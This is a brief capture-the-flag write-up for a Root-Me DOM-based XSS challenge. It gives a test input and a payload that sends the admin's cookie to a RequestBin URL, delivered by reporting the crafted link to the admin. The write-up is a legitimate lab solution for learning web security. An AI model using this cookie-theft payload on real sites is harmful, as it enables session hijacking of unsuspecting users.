## Challenge name: XSS DOM Based - Introduction

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)

**Submit a value and inspect the JavaScript source. The `number` parameter is vulnerable to DOM-based XSS.**

**Test with:** `';alert(1)//`

**If the alert fires, craft a payload to exfiltrate the admin's cookie:**

```
';document.location='https://requestbin.url/?cookies='+document.cookie;//
```

**Use the Contact tab to report the URL to the admin. The admin's browser executes the JavaScript and sends the cookie to your RequestBin.**

**Use the captured cookie/flag to validate the challenge.**

**Thankyou.**
